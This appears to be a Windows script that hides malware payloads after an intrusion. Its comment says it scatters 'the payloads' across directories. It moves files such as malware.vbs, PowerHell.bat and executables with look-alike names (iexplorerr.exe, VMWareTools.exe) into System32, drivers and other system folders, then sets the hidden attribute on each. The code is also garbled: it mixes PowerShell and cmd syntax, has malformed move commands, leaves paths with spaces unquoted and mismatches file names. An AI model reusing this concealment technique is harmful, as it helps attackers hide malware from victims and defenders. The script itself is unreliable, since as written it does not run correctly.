# The following script when scatter all of the payloads to different directories to hide them. Note they can still be tracked down, but its good to not keep all your eggs in one basket. 

# set PWD to C:

# Find malware.vbs 
$malvbsLoc = dir malware.vbs /s /p
# Move malware.vbs
move $malvbsLoc C:\Windows\System32
# Hide the file from windows explorer using attrib 
attrib +h C:\Windows\System32\malware.vbs

# Find iexplorerr.exe
$iexplorerrLoc = dir iexplorer.exe /s /p
# Move iexplorerr.exe
move $iexplorerrLoc = "C:\Program Files\Common Files\System"
# Hide the file from windows explorer using attrib
attrib +h "C:\Program Files\Common Files\System\iexplorerr.exe"

# Find PowerHell.bat
$powerhellLoc = dir powerHell.bat /s /p
# Move PowerHell.bat
move $powerhellLoc C:\Windows\System32
# Hide the file from windows explorer using attrib
attrib +h C:\Windows\System32\PowerHell.bat

# Find PowerManagement.exe
$powermanLoc = dir PowerManagement.exe /s /p
# Move PowerManagement.exe
move $powermanLoc C:\Program Files\MSBuild\Microsoft
# Hide the file from windows explorer using attrib
attrib +h  C:\Program Files\MSBuild\Microsoft\PowerManagement.exe

# Find VMWareTools.exe
$vmwaretoolsLoc = dir VMWareTools.exe /s /p
# Move VMWareTools.exe
move $vmwaretoolsLoc C:\Users\Public
# Hide VMWareTools.exe
attrib +h C:\Users\Public\VMWareTools.exe

# Find DiskHelper.exe
$diskhelperLoc = dir DiskHelper.exe /s /p
# Move DiskHelper.exe
move $diskhelperLoc = C:\Windows\drivers
# Hide DiskHelper.exe
attrib +h C:\Windows\drivers\DiskHelper.exe

# Find audio.exe
$audioLoc = dir audio.exe /s /p
# Move audio.exe
move $audioLoc C:\Windows\DigitalLocker\en-us
# Hide audio.exe 
attrib +h C:\Windows\DigitalLocker\en-us\audio.exe

# Find LogMGMT.exe 
$logmgmtLoc = dir LogMGMT.exe /s /p
# Move LogMGMT
move $logmgmtLoc C:\Windows\Globalization\ELS
# Hide LogMGMT.exe
attrib +h C:\Windows\Globalization\ELS\LogMGMT.exe

